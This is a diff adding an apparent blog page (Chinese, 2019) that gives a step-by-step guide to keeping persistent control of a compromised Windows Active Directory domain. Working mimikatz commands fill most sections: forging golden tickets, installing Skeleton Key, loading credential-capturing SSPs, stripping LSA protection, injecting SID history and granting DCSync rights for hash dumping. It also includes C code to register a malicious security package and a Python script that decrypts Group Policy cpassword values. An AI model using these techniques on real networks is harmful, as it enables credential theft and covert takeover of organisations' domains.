@@ -1,0 +1,247 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 域渗透-域维权 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="域渗透-域维权 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">域渗透-域维权</h1><div class="post-time">Sep 11, 2019</div><div class="post-content"><h3><span id="黄金票据">黄金票据</span></h3><h4><span id="简介">简介</span></h4><p>Golden Ticket（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p>
+<p><strong>制作金票的条件：</strong></p>
+<blockquote>
+<p>1、域名称</p>
+<p>2、域的SID值</p>
+<p>3、域的KRBTGT账户密码HASH </p>
+<p>4、伪造用户名，可以是任意的</p>
+</blockquote>
+<h4><span id="利用过程">利用过程</span></h4><p>金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt</span><br></pre></td></tr></table></figure>
+<p>命令获取krbtgt的值。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566542295163.png" alt="1566542295163"></p>
+<p>得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p>
+<p>参数说明：</p>
+<blockquote>
+<p>/admin：伪造的用户名</p>
+<p>/domain：域名称</p>
+<p>/sid：SID值，注意是去掉最后一个-后面的值</p>
+<p>/krbtgt：krbtgt的HASH值</p>
+<p>/ticket：生成的票据名称</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566543225966.png" alt="1566543225966"></p>
+<p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ppt golden.kiribi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566542805439.png" alt="1566542805439"></p>
+<p>此时就可以通过dir成功访问域控的共享文件夹。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA2010SP3.0day.org\c$</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566543260644.png" alt="1566543260644"></p>
+<h3><span id="ssp密码记录">SSP密码记录</span></h3><h4><span id="简介">简介</span></h4><p><strong>SSP：</strong>Security Support Provider，直译为安全支持提供者，又名Security Package.</p>
+<p>简单的理解为SSP就是一个DLL，用来实现身份认证。</p>
+<p><strong>SSPI：</strong>Security Support Provider Interface，直译为安全支持提供程序接口，是Windows系统在执行认证操作所使用的API。</p>
+<p>简单的理解为SSPI是SSP的API接口</p>
+<p><strong>LSA：</strong>Local Security Authority，用于身份认证，常见进程为lsass.exe</p>
+<p>特别的地方在于LSA是可扩展的，在系统启动的时候SSP会被加载到进程lsass.exe中.</p>
+<p>这相当于我们可以自定义一个dll，在系统启动的时候被加载到进程lsass.exe。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568039967810.png" alt="1568039967810"></p>
+<p>如图，这是正常的SSPI结构图，Client APP是我们自定义的dll，通过Secur32.dll可以调用 “<code>credential capture API</code>“来获取LSA的信息</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568041132774.png" alt="1568041132774"></p>
+<p>上图展示了攻击思路，既然可以自定义dll,那么我们就可以定制dll的功能，通过<code>Named Pipe</code>和<code>Shared Memory</code>直接获取<code>lsass.exe</code>中的明文密码，并且能够在其更改密码时立即获得新密码。</p>
+<h4><span id="mimilib-ssp">mimilib SSP</span></h4><p>mimikatz早已支持这个功能，而这个文件就是我们使用的时候常常忽略的mimilib.dll</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568041283216.png" alt="1568041283216"></p>
+<h4><span id="利用过程">利用过程</span></h4><h5><span id="方法一">方法一</span></h5><ol>
+<li><p>添加SSP</p>
+<p>将mimilib.dll复制到域控<code>c:\windows\system32</code>下</p>
+</li>
+</ol>
+<ol>
+<li><p>设置SSP</p>
+<p>修改域控注册表位置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568042525270.png" alt="1568042525270"></p>
+</li>
+</ol>
+<p>   3.重启系统</p>
+<p>   域控重启后在<code>c:\windows\system32</code>可看到新生成的文件kiwissp.log</p>
+<p>   <img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568084137907.png" alt="1568084137907"></p>
+<h5><span id="方法二使用api-addsecuritypackage">方法二：使用API AddSecurityPackage</span></h5><p>   (1)复制文件</p>
+<p>   同方法1</p>
+<p>   (2)修改注册表</p>
+<p>   同方法1</p>
+<p>   (3)调用AddSecurityPackage</p>
+<p>   测试代码如下：</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   #define SECURITY_WIN32</span><br><span class="line">   </span><br><span class="line">   #include &lt;stdio.h&gt;</span><br><span class="line">   #include &lt;Windows.h&gt;</span><br><span class="line">   #include &lt;Security.h&gt;</span><br><span class="line">   #pragma comment(lib,&quot;Secur32.lib&quot;)</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   int main(int argc, char **argv) &#123;</span><br><span class="line">   	SECURITY_PACKAGE_OPTIONS option;</span><br><span class="line">   	option.Size = sizeof(option);</span><br><span class="line">   	option.Flags = 0;</span><br><span class="line">   	option.Type = SECPKG_OPTIONS_TYPE_LSA;</span><br><span class="line">   	option.SignatureSize = 0;</span><br><span class="line">   	option.Signature = NULL;</span><br><span class="line">   	SECURITY_STATUS SEC_ENTRYnRet = AddSecurityPackageA(&quot;mimilib&quot;, &amp;option);</span><br><span class="line">   	printf(&quot;AddSecurityPackage return with 0x%X\n&quot;, SEC_ENTRYnRet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>   添加成功，如果此时输入了新的凭据(例如runas，或者用户锁屏后重新登录)，将会生成文件<code>kiwissp.log</code></p>
+<p>   方法2的自动化实现：</p>
+<p>   <a href="https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/persistence/Install-SSP.ps1" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/persistence/Install-SSP.ps1</a></p>
+<h5><span id="方法3使用rpc控制lsass加载ssp">方法3：使用RPC控制lsass加载SSP</span></h5><p>   XPN开源的代码：</p>
+<p>   <a href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e" target="_blank" rel="noopener">https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e</a></p>
+<p>   测试如下图</p>
+<p>   <img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\01598fc92c60f512ae9d.png" alt="111"></p>
+<p>   添加成功</p>
+<p>   优点：</p>
+<ul>
+<li>不需要写注册表</li>
+<li>不调用API AddSecurityPackage</li>
+<li>不需要对lsass进程的内存进行写操作</li>
+<li>lasss进程中不存在加载的dll</li>
+</ul>
+<h4><span id="memory-updating-of-ssps">Memory Updating of SSPs</span></h4><p>   mimikatz同时还支持通过内存更新ssp，这样就不需要重启再获取账户信息</p>
+<p>   需要使用mimikatz.exe，命令如下：</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>
+<p>   通过修改lsass进程的内存，实现从lsass进程中提取凭据</p>
+<p>   <img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568097386864.png" alt="1568097386864"></p>
+<p>   命令执行后，如果此时输入了新的凭据(例如runas，或者用户锁屏后重新登录)，将会在<code>c:\windows\system32</code>下生成文件<code>mimilsa.log</code></p>
+<p>   <img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568097442668.png" alt="1568097442668"></p>
+<h3><span id="skeleton-key">Skeleton Key</span></h3><p>Skeleton Key是一种不需要域控重启即能生效的维持域控权限方法。</p>
+<h4><span id="简介">简介</span></h4><blockquote>
+<p>Skeleton Key被安装在64位的域控服务器上<br>支持Windows Server2003—Windows Server2012 R2<br>能够让所有域用户使用同一个万能密码进行登录<br>现有的所有域用户使用原密码仍能继续登录<br>重启后失效<br>支持 Skeleton Key</p>
+</blockquote>
+<h4><span id="利用过程">利用过程</span></h4><h5><span id="在域控安装skeleton-key">在域控安装Skeleton Key</span></h5><p><strong>mimikatz命令：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568098265598.png" alt="1568098265598"></p>
+<h5><span id="域内主机使用skeleton-key登录域控">域内主机使用Skeleton Key登录域控</span></h5><p>mimikatz的默认Skeleton Key设置为mimikatz</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\OWA2010SP3.0day.org mimikatz /user:administrator@0day.org</span><br><span class="line">dir \\OWA2010SP3.0day.org\c$</span><br></pre></td></tr></table></figure>
+<p> Skeleton Key只是给所有账户添加了一个万能密码，无法修改账户的权限</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568099168617.png" alt="1568099168617"></p>
+<h5><span id="绕过lsa-protection">绕过LSA Protection</span></h5><p><strong>配置LSA Protection</strong></p>
+<p>注册表位置：<br><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code></p>
+<p>新建-<code>DWORD</code>值，名称为<code>RunAsPPL</code>,数值为<code>00000001</code></p>
+<p>重启系统</p>
+<p><strong>使用mimidrv.sys绕过</strong></p>
+<p><strong>mimikatz命令：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
+<p><strong>绕过cmd、regedit、taskmgr</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::cmd</span><br><span class="line">misc::regedit</span><br><span class="line">misc::taskmgr</span><br></pre></td></tr></table></figure>
+<h3><span id="hook-passwordchangenotify">Hook PasswordChangeNotify</span></h3><h4><span id="简介">简介</span></h4><p>Hook PasswordChangeNotify这个概念最早是在2013年9月15日由clymb3r提出，通过Hook PasswordChangeNotify拦截修改的帐户密码。</p>
+<p>需要了解的相关背景知识如下：</p>
+<ol>
+<li><p>在修改域控密码时会进行如下同步操作：</p>
+<p>a. 当修改域控密码时，LSA首先调用PasswordFileter来判断新密码是否符合密码复杂度要求</p>
+<p>b. 如果符合，LSA接着调用PasswordChangeNotify在系统上同步更新密码</p>
+</li>
+<li><p>函数PasswordChangeNotify存在于rassfm.dll</p>
+</li>
+<li><p>rassfm.dll可理解为Remote Access Subauthentication dll，只存在于在Server系统下，xp、win7、win8等均不存在</p>
+</li>
+</ol>
+<p>Hook PasswordChangeNotify有如下优点：</p>
+<ol>
+<li>不需要重启</li>
+<li>不需要修改注册表</li>
+<li>甚至不需要在系统放置dll</li>
+</ol>
+<h4><span id="利用过程">利用过程</span></h4><p>实现Hook PasswordChangeNotify共包含两部分：Hook dll和dll注入。</p>
+<p><a href="https://github.com/3gstudent/Hook-PasswordChangeNotify" target="_blank" rel="noopener">https://github.com/3gstudent/Hook-PasswordChangeNotify</a></p>
+<p>编译工程，生成HookPasswordChange.dll</p>
+<p>MFC设置为在静态库中使用MFC</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568103854190.png" alt="1568103854190"></p>
+<p>上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll到域控主机</p>
+<p>管理员权限执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568104973054.png" alt="1568104973054"></p>
+<p>手动修改域控密码后<br>在C:\Windows\Temp下可以找到passwords.txt，其中记录了新修改的密码。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568105156124.png" alt="1568105156124"></p>
+<p>自定义dll代码实现更多高级功能，如自动上传新密码。</p>
+<p>以下链接中的代码可作为参考，其中实现了将获取的新密码上传至Http服务器</p>
+<p><a href="http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html" target="_blank" rel="noopener">http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html</a></p>
+<h3><span id="dsrm同步指定域用户">DSRM同步指定域用户</span></h3><h4><span id="dsrm密码同步">DSRM密码同步</span></h4><p>Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。</p>
+<p>利用如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ntdsutil</span><br><span class="line">ntdsutil: set DSRM password</span><br><span class="line">Reset DSRM Administrator Password: SYNC FROM DOMAIN ACCOUNT test</span><br><span class="line">Password has been synchronized successfully.</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568118352518.png" alt="1568118352518"></p>
+<p>同步之后使用mimikatz查看test用户和SAM中Administrator的NTLM值。如下图所示，可以看到两个账户的NTLM值相同，说明确实同步成功了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /name:test /inject</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568118643769.png" alt="1568118643769"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568118740466.png" alt="1568118740466"></p>
+<h4><span id="修改注册表允许dsrm账户远程访问">修改注册表允许DSRM账户远程访问</span></h4><p>修改注册表 <code>HKLM\System\CurrentControlSet\Control\Lsa 路径下的 DSRMAdminLogonBehavior</code> 的值为2。</p>
+<p>PS：系统默认不存在<code>DSRMAdminLogonBehavior</code>，手动添加。</p>
+<p>DSRM账户是域控的本地管理员账户，并非域的管理员帐户。所以DSRM密码同步之后并不会影响域的管理员帐户。另外，在下一次进行DSRM密码同步之前，NTLM的值一直有效。所以为了保证权限的持久化，尤其在跨国域或上百上千个域的大型内网中，最好在事件查看器的安全事件中筛选事件ID为4794的事件日志，来判断域管是否经常进行DSRM密码同步操作。</p>
+<h3><span id="sid-history">SID history</span></h3><p><a href="https://msdn.microsoft.com/en-us/library/ms679833(v=vs.85" target="_blank" rel="noopener">SID历史记录</a>.aspx)是支持<a href="https://technet.microsoft.com/en-us/library/cc779590(v=ws.10" target="_blank" rel="noopener">迁移方案的属性</a>.aspx)。每个用户帐户都有一个关联的<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa379571(v=vs.85" target="_blank" rel="noopener">安全标识符（SID）</a>.aspx)，用于跟踪安全主体和连接到资源时的帐户及访问权限。SID历史记录允许另一个帐户的访问被有效的克隆到另一个帐户。这是非常有用的，其目的是确保用户在从一个域移动（迁移）到另一个域时能保留原有的访问权限。由于在创建新帐户时用户的SID会发生更改，旧的SID需要映射到新的帐户。当域A中的用户迁移到域B时，将在DomainB中创建新的用户帐户，并将DomainA用户的SID添加到DomainB的用户帐户的SID历史记录属性中。这样就可以确保DomainB用户仍可以访问DomainA中的资源。</p>
+<p>Mimikatz支持SID历史注入到任何用户帐户（需要域管理员或等效的权限）。在这种情况下，攻击者创建用户帐户“test”，并将该域的默认管理员帐户“Administrator”（RID 500）添加到帐户的SID历史记录属性中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::add /new:[DomainAdmin&apos;s SID or NAME] /sam:[CommonUserNAME]</span><br></pre></td></tr></table></figure>
+<p>当test登录时，将对与该帐户相关联的SID进行评估，并根据这些SID来确定访问权限。由于test帐户与Administrator帐户（RID 500）相关联，因此，test帐户具有Administrator帐户的所有访问权限，包括域管理员权限。</p>
+<h3><span id="gpo组策略后门">GPO[组策略]后门</span></h3><h4><span id="利用sysvol还原组策略中保存的密码">利用SYSVOL还原组策略中保存的密码</span></h4><p>使用Group Policy Preferences配置组策略批量修改用户本地管理员密码。</p>
+<p>开始-管理工具-组策略管理</p>
+<p>选择域，创建GP0</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568190482125.png" alt="1568190482125"></p>
+<p>设置名称为test</p>
+<p>test-设置-右键-编辑-用户配置-首选项-控制面板设置-本地用户和组</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568190567581.png" alt="1568190567581"></p>
+<p>更新，administrator(内置),设置密码</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568190624962.png" alt="1568190624962"></p>
+<p>委派，设置权限</p>
+<p>在详细一栏，可看到该策略对应的ID为<code>{05F24259-49D8-481A-8408-567DC3155838}</code></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568190671139.png" alt="1568190671139"></p>
+<p>组策略配置完成，域内主机重新登录，即可应用此策略</p>
+<p>在对应的文件夹下能找到配置文件Groups.xml，具体路径如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\0day.org\SYSVOL\0day.org\Policies\&#123;05F24259-49D8-481A-8408-567DC3155838&#125;\User\Preferences\Groups</span><br></pre></td></tr></table></figure>
+<p>Groups.xml内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;Groups clsid=&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;&gt;&lt;User clsid=&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot; name=&quot;Administrator (内置)&quot; image=&quot;2&quot; changed=&quot;2019-09-11 08:29:51&quot; uid=&quot;&#123;32DED100-2B0D-41CB-8341-F5FBCF77FE13&#125;&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;Hd/xxCN9bFRTj8C2az+0t3el0u3Dn68pZ1Sd4IHmbPw&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; subAuthority=&quot;RID_ADMIN&quot; userName=&quot;Administrator (内置)&quot;/&gt;&lt;/User&gt;</span><br><span class="line">&lt;/Groups&gt;</span><br></pre></td></tr></table></figure>
+<p>cpassword项，保存的是加密后的内容<code>&quot;Hd/xxCN9bFRTj8C2az+0t3el0u3Dn68pZ1Sd4IHmbPw&quot;</code></p>
+<p>加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了该AES 256加密的私钥，地址如下：</p>
+<p><a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/cc422924.aspx</a></p>
+<p>借助该私钥，我们就能还原出明文</p>
+<p>采用Chris Campbell @obscuresec开源的powershell脚本，地址如下：</p>
+<p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p>
+<p>该脚本可在域内主机上执行，能够自动查询共享文件夹\SYSVOL中的文件。</p>
+<p>也可以利用如下代码进行解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import sys</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from base64 import b64decode</span><br><span class="line"></span><br><span class="line">if(len(sys.argv) != 2):</span><br><span class="line">  print &quot;decrypt.py &lt;cpassword&gt;&quot;</span><br><span class="line">  sys.exit(0)</span><br><span class="line"></span><br><span class="line">key = &quot;&quot;&quot;4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b&quot;&quot;&quot;.decode(&apos;hex&apos;)</span><br><span class="line">cpassword = sys.argv[1]</span><br><span class="line">cpassword += &quot;=&quot; * ((4 - len(cpassword) % 4) % 4)</span><br><span class="line">password = b64decode(cpassword)</span><br><span class="line">out = AES.new(key, AES.MODE_CBC, &quot;\x00&quot; * 16)</span><br><span class="line">out = out.decrypt(password)</span><br><span class="line">print out[:-ord(out[-1])].decode(&apos;utf16&apos;)</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568191571479.png" alt="1568191571479"></p>
+<h4><span id="通过group-policy-management-console-gpmc-实现计划任务的远程执行">通过Group Policy Management Console (GPMC) 实现计划任务的远程执行</span></h4><p>同上创建GPO，在计划任务中添加。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568192348420.png" alt="1568192348420"></p>
+<p>第四个任务选项会在每次组策略刷新时执行。</p>
+<p>四种计划任务的区别可参考官方文档：</p>
+<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc770904(v%3dws.11" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc770904(v%3dws.11</a>)</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568192727717.png" alt="1568192727717"></p>
+<p>对于域内的主机，可以等待90分钟使组策略自动更新，也可以在客户端执行如下命令强制刷新组策略：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure>
+<h3><span id="dcsync">DCSync</span></h3><h4><span id="利用dcsync导出域内所有用户hash的方法">利用DCSync导出域内所有用户hash的方法</span></h4><p><strong>利用条件：</strong></p>
+<p>获得以下任一用户的权限：</p>
+<ul>
+<li>Administrators组内的用户</li>
+<li>Domain Admins组内的用户</li>
+<li>Enterprise Admins组内的用户</li>
+<li>域控制器的计算机帐户</li>
+</ul>
+<p>导出域内所有用户的hash：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:rootkit.org /all /csv&quot; exit</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568197137085.png" alt="1568197137085"></p>
+<h4><span id="利用dcsync在域内维持权限的方法">利用DCSync在域内维持权限的方法</span></h4><p><strong>利用条件：</strong></p>
+<p>获得以下任一用户的权限：</p>
+<ul>
+<li>Domain Admins组内的用户</li>
+<li>Enterprise Admins组内的用户</li>
+</ul>
+<p><strong>利用原理：</strong></p>
+<p>向域内的一个普通用户添加如下三条ACE(Access Control Entries)：</p>
+<ul>
+<li>DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li>
+<li>DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li>
+<li>DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</li>
+</ul>
+<p>该用户即可获得利用DCSync导出域内所有用户hash的权限。</p>
+<p>Windows系统中的ACL(Access Control List)，用来表示用户（组）权限的列表。</p>
+<p><strong>利用方法：</strong></p>
+<p>利用PowerView.ps1，添加ACE的命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=0day,DC=org&quot; -PrincipalIdentity webadmin -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568202728574.png" alt="1568202728574"></p>
+<p>删除ACE的命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC=0day,DC=org&quot; -PrincipalIdentity webadmin -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure>
+<p>在域内一台登录了sqladmin用户的主机上面，就能使用mimikatz的DCSync功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:0day.org /all /csv&quot; exit</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568203197954.png" alt="1568203197954"></p>
+<h3><span id="adminsdholder">AdminSDHolder</span></h3><p>AdminSDHolder是一个特殊的AD容器，具有一些默认安全权限，用作受保护的AD账户和组的模板</p>
+<p>Active Directory将采用AdminSDHolder对象的ACL并定期将其应用于所有受保护的AD账户和组，以防止意外和无意的修改并确保对这些对象的访问是安全的</p>
+<p>如果能够修改AdminSDHolder对象的ACL，那么修改的权限将自动应用于所有受保护的AD账户和组，这可以作为一个域环境权限维持的方法</p>
+<h4><span id="向adminsdholder对象添加acl">向AdminSDHolder对象添加ACL</span></h4><p>使用PowerView，添加用户dbadmin 的完全访问权限</p>
